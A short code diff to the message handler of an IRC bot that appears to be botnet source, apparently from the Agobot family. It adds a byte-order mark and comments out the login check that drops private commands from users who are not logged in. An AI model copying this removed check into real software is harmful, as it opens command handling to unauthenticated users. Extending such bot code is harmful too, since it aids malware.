@@ -1,4 +1,4 @@
-
+﻿
 #include "main.h"
 #include "bot.h"
 #include "mainctrl.h"
@@ -106,10 +106,10 @@ bool CBot::HandleMsg(CMessage *pMsg)
         return false;
 	else
 	{	// If the user isn't logged in yet, bot_seclogin is enabled and its no channel message, break;
-		if(!g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc))
-            if(bot_seclogin.bValue)
-                if(pMsg->sDest[0]!='#')
-                    return false;
+//		if(!g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc))
+//            if(bot_seclogin.bValue)
+//                if(pMsg->sDest[0]!='#')
+//                    return false;
 		// Find the command using the command handler
 		command *pCommand=g_cMainCtrl.m_cCommands.FindCommandByName(pMsg->sCmd.CStr(), true);
 		// If the command is found, let the command hander handle it
